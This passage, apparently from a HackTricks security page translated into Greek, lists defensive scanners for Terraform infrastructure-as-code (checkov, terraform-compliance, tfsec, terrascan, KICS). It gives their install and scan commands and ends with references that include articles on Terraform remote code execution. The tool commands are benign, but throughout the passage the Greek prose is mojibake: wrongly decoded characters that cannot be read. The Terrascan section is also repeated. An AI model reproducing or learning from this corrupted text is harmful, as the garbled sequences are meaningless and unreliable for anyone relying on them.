Î±Ï†Î¿ÏÎ¿ÏÎ½ Ï„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± ÎºÎ±Î¹ Ï„Î· ÏƒÏ…Î¼Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ graph-based scanning.

Î•ÎºÏ„ÎµÎ»ÎµÎ¯ [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ ÏƒÎ¬ÏÏ‰ÏƒÎ· Ï€Î±ÎºÎ­Ï„Ï‰Î½ Î±Î½Î¿Î¹Ï‡Ï„Î¿Ï ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ ÎµÎ¹ÎºÏŒÎ½Ï‰Î½ Î³Î¹Î± Common Vulnerabilities and Exposures (CVEs).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÎ»Î±Ï†ÏÏ Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Î´Î¿ÎºÎ¹Î¼ÏÎ½ ÎµÏƒÏ„Î¹Î±ÏƒÎ¼Î­Î½Î¿ ÏƒÏ„Î·Î½ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± ÎºÎ±Î¹ Ï„Î· ÏƒÏ…Î¼Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Î³Î¹Î± Ï„Î¿ terraform, Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Î±ÏÎ½Î·Ï„Î¹ÎºÎ®Ï‚ Î´Î¿ÎºÎ¹Î¼Î®Ï‚ Î³Î¹Î± Ï„Î·Î½ Ï…Ï€Î¿Î´Î¿Î¼Î®-Ï‰Ï‚-ÎºÏÎ´Î¹ÎºÎ± ÏƒÎ±Ï‚.

- **compliance:** Î”Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶ÎµÎ¹ ÏŒÏ„Î¹ Î¿ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï€ÏÏŒÏ„Ï…Ï€Î± Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÎºÎ±Î¹ Ï„Î± Î´Î¹ÎºÎ¬ ÏƒÎ±Ï‚ Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î± Ï€ÏÏŒÏ„Ï…Ï€Î±
- **behaviour driven development:** ÎˆÏ‡Î¿Ï…Î¼Îµ BDD Î³Î¹Î± ÏƒÏ‡ÎµÎ´ÏŒÎ½ Ï„Î± Ï€Î¬Î½Ï„Î±, Î³Î¹Î±Ï„Î¯ ÏŒÏ‡Î¹ ÎºÎ±Î¹ Î³Î¹Î± IaC ;
- **portable:** Î±Ï€Î»ÏÏ‚ ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Ï„Î¿ Î±Ï€ÏŒ `pip` Î® Ï„ÏÎ­Î¾Ï„Îµ Ï„Î¿ Î¼Î­ÏƒÏ‰ `docker`. See [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** ÎµÏ€Î¹ÎºÏ…ÏÏÎ½ÎµÎ¹ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ¬ ÏƒÎ±Ï‚ Ï€ÏÎ¹Î½ Î±Î½Î±Ï€Ï„Ï…Ï‡Î¸ÎµÎ¯
- **easy to integrate:** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„ÏÎ­Î¾ÎµÎ¹ ÏƒÏ„Î¿ pipeline ÏƒÎ±Ï‚ (Î® ÏƒÎµ git hooks) Î³Î¹Î± Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¯ÏƒÎµÎ¹ ÏŒÏ„Î¹ ÏŒÎ»ÎµÏ‚ Î¿Î¹ Î±Î½Î±Ï€Ï„ÏÎ¾ÎµÎ¹Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹ÎºÏ…ÏÏ‰Î¼Î­Î½ÎµÏ‚.
- **segregation of duty:** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÏÎ±Ï„Î®ÏƒÎµÏ„Îµ Ï„Î± tests ÏƒÎ±Ï‚ ÏƒÎµ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ repository ÏŒÏ€Î¿Ï… Î¼Î¹Î± Î¾ÎµÏ‡Ï‰ÏÎ¹ÏƒÏ„Î® Î¿Î¼Î¬Î´Î± ÎµÎ¯Î½Î±Î¹ Ï…Ï€ÎµÏÎ¸Ï…Î½Î·.

> [!NOTE]
> Î”Ï…ÏƒÏ„Ï…Ï‡ÏÏ‚, ÎµÎ¬Î½ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎºÎ¬Ï€Î¿Î¹Î¿Ï…Ï‚ providers ÏƒÏ„Î¿Ï…Ï‚ Î¿Ï€Î¿Î¯Î¿Ï…Ï‚ Î´ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·, Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¿ `terraform plan` ÎºÎ±Î¹ Î½Î± Ï„ÏÎ­Î¾ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

Î‘Ï€ÏŒ Ï„Î± [**docs**](https://github.com/aquasecurity/tfsec): Ï„Î¿ tfsec Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÏƒÏ„Î±Ï„Î¹ÎºÎ® Î±Î½Î¬Î»Ï…ÏƒÎ· Ï„Î¿Ï… terraform ÎºÏÎ´Î¹ÎºÎ¬ ÏƒÎ±Ï‚ Î³Î¹Î± Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹ Ï€Î¹Î¸Î±Î½Î­Ï‚ Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚.

- â˜ï¸ Î•Î»Î­Î³Ï‡ÎµÎ¹ Î³Î¹Î± Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÏƒÎµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ Î¼ÎµÎ³Î¬Î»Î¿Ï…Ï‚ (ÎºÎ±Î¹ ÎºÎ¬Ï€Î¿Î¹Î¿Ï…Ï‚ Î¼Î¹ÎºÏÏŒÏ„ÎµÏÎ¿Ï…Ï‚) Ï€Î±ÏÏŒÏ‡Î¿Ï…Ï‚ cloud
- â›” Î•ÎºÎ±Ï„Î¿Î½Ï„Î¬Î´ÎµÏ‚ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î¿Î¹ ÎºÎ±Î½ÏŒÎ½ÎµÏ‚
- ğŸª† Î£ÎºÎ±Î½Î¬ÏÎµÎ¹ modules (Ï„Î¿Ï€Î¹ÎºÎ¬ ÎºÎ±Î¹ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î±)
- â• Î‘Î¾Î¹Î¿Î»Î¿Î³ÎµÎ¯ ÎµÎºÏ†ÏÎ¬ÏƒÎµÎ¹Ï‚ HCL ÎºÎ±Î¸ÏÏ‚ ÎºÎ±Î¹ literal Ï„Î¹Î¼Î­Ï‚
- â†ªï¸ Î‘Î¾Î¹Î¿Î»Î¿Î³ÎµÎ¯ Terraform functions Ï€.Ï‡. `concat()`
- ğŸ”— Î‘Î¾Î¹Î¿Î»Î¿Î³ÎµÎ¯ ÏƒÏ‡Î­ÏƒÎµÎ¹Ï‚ Î¼ÎµÏ„Î±Î¾Ï Terraform resources
- ğŸ§° Î£Ï…Î¼Î²Î±Ï„ÏŒ Î¼Îµ Ï„Î¿ Terraform CDK
- ğŸ™… Î•Ï†Î±ÏÎ¼ÏŒÎ¶ÎµÎ¹ (ÎºÎ±Î¹ ÎµÎ¼Ï€Î»Î¿Ï…Ï„Î¯Î¶ÎµÎ¹) user-defined Rego policies
- ğŸ“ƒ Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï€Î¿Î»Î»Î±Ï€Î»Î­Ï‚ Î¼Î¿ÏÏ†Î­Ï‚ ÎµÎ¾ÏŒÎ´Î¿Ï…: lovely (default), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- ğŸ› ï¸ Î¡Ï…Î¸Î¼Î¹Î¶ÏŒÎ¼ÎµÎ½Î¿ (Î¼Î­ÏƒÏ‰ CLI flags ÎºÎ±Î¹/Î® Î±ÏÏ‡ÎµÎ¯Î¿Ï… config)
- âš¡ Î Î¿Î»Ï Î³ÏÎ®Î³Î¿ÏÎ¿, Î¹ÎºÎ±Î½ÏŒ Î½Î± ÏƒÎºÎ±Î½Î¬ÏÎµÎ¹ Î³ÏÎ®Î³Î¿ÏÎ± Ï„ÎµÏÎ¬ÏƒÏ„Î¹Î± repositories
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Î¤Î¿ Terrascan ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ ÏƒÏ„Î±Ï„Î¹ÎºÏŒÏ‚ code analyzer Î³Î¹Î± Infrastructure as Code. Î¤Î¿ Terrascan ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹:

- Î£Î±ÏÏÎ½ÎµÎ¹ Î±Ï€ÏÏŒÏƒÎºÎ¿Ï€Ï„Î± Ï„Î·Î½ infrastructure as code Î³Î¹Î± Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚.
- Î Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï„Î·Î½ Ï€Î±ÏÎµÏ‡ÏŒÎ¼ÎµÎ½Î· cloud infrastructure Î³Î¹Î± Î±Î»Î»Î±Î³Î­Ï‚ ÏƒÏ„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï€Î¿Ï… ÎµÎ¹ÏƒÎ¬Î³Î¿Ï…Î½ posture drift, ÎºÎ±Î¹ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÎµ Î±ÏƒÏ†Î±Î»Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·.
- Î•Î½Ï„Î¿Ï€Î¯Î¶ÎµÎ¹ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÎºÎ±Î¹ Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î¼Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚.
- ÎœÎµÎ¹ÏÎ½ÎµÎ¹ Ï„Î¿Ï…Ï‚ ÎºÎ¹Î½Î´ÏÎ½Î¿Ï…Ï‚ Ï€ÏÎ¹Î½ Ï„Î·Î½ Ï€Î±ÏÎ¿Ï‡Î® cloud native infrastructure.
- Î ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ ÎµÏ…ÎµÎ»Î¹Î¾Î¯Î± Î³Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï€Î¹ÎºÎ¬ Î® ÎµÎ½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ· Î¼Îµ Ï„Î¿ CI\CD ÏƒÎ±Ï‚.
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Î•Î½Ï„Î¿Ï€Î¯ÏƒÏ„Îµ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚, Î¶Î·Ï„Î®Î¼Î±Ï„Î± ÏƒÏ…Î¼Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½ÎµÏ‚ Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎµÎ¹Ï‚ Ï…Ï€Î¿Î´Î¿Î¼Î®Ï‚ Î½Ï‰ÏÎ¯Ï‚ ÏƒÏ„Î¿Î½ ÎºÏÎºÎ»Î¿ Î±Î½Î¬Ï€Ï„Ï…Î¾Î·Ï‚ Ï„Î·Ï‚ infrastructure-as-code ÏƒÎ±Ï‚ Î¼Îµ Ï„Î¿ **KICS** Î±Ï€ÏŒ Ï„Î·Î½ Checkmarx.

**KICS** ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ **K**eeping **I**nfrastructure as **C**ode **S**ecure, ÎµÎ¯Î½Î±Î¹ Î±Î½Î¿Î¹Ï‡Ï„Î¿Ï ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿ Î³Î¹Î± ÎºÎ¬Î¸Îµ cloud native project.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan): Terrascan is a static code analyzer for Infrastructure as Code. Terrascan allows you to:

- Î£Î¬ÏÏ‰ÏƒÎ· Ï„Î¿Ï… Infrastructure as Code Î³Î¹Î± Î»Î±Î½Î¸Î±ÏƒÎ¼Î­Î½ÎµÏ‚ Î´Î¹Î±Î¼Î¿ÏÏ†ÏÏƒÎµÎ¹Ï‚.
- Î Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ· Ï„Î·Ï‚ provisioned cloud Ï…Ï€Î¿Î´Î¿Î¼Î®Ï‚ Î³Î¹Î± Î±Î»Î»Î±Î³Î­Ï‚ Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚ Ï€Î¿Ï… ÎµÎ¹ÏƒÎ¬Î³Î¿Ï…Î½ posture drift, ÎºÎ±Î¹ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÏƒÎµ Î±ÏƒÏ†Î±Î»Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·.
- Î‘Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ· ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÎºÎ±Î¹ Ï€Î±ÏÎ±Î²Î¬ÏƒÎµÏ‰Î½ ÏƒÏ…Î¼Î¼ÏŒÏÏ†Ï‰ÏƒÎ·Ï‚.
- ÎœÎµÎ¯Ï‰ÏƒÎ· ÎºÎ¹Î½Î´ÏÎ½Ï‰Î½ Ï€ÏÎ¹Î½ Ï„Î·Î½ Ï€ÏÎ¿Î¼Î®Î¸ÎµÎ¹Î± cloud native Ï…Ï€Î¿Î´Î¿Î¼Î®Ï‚.
- Î ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ ÎµÏ…ÎµÎ»Î¹Î¾Î¯Î± Î³Î¹Î± ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï€Î¹ÎºÎ¬ Î® ÎµÎ½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ· Î¼Îµ Ï„Î¿ CI\CD ÏƒÎ±Ï‚.
```bash
brew install terrascan
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· token ÏƒÏ„Î¿ Terraform Cloud Ï€Î¿Ï… Î¼ÎµÏ„Î±Ï„ÏÎ­Ï€ÎµÎ¹ speculative plan ÏƒÎµ remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Î”Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Terraform Cloud](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API â€“ Î•Î¼Ï†Î¬Î½Î¹ÏƒÎ· workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [Î”Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· AWS provider](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI â€“ Î‘Î½Î¬Î»Î·ÏˆÎ· ÏÏŒÎ»Î¿Ï… OIDC](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider â€“ Î§ÏÎ®ÏƒÎ· Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform â€“ Î•Ï…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs â€“ Gitflops: ÎºÎ¯Î½Î´Ï…Î½Î¿Î¹ Ï„Ï‰Î½ Ï€Î»Î±Ï„Ï†Î¿ÏÎ¼ÏÎ½ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Terraform](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
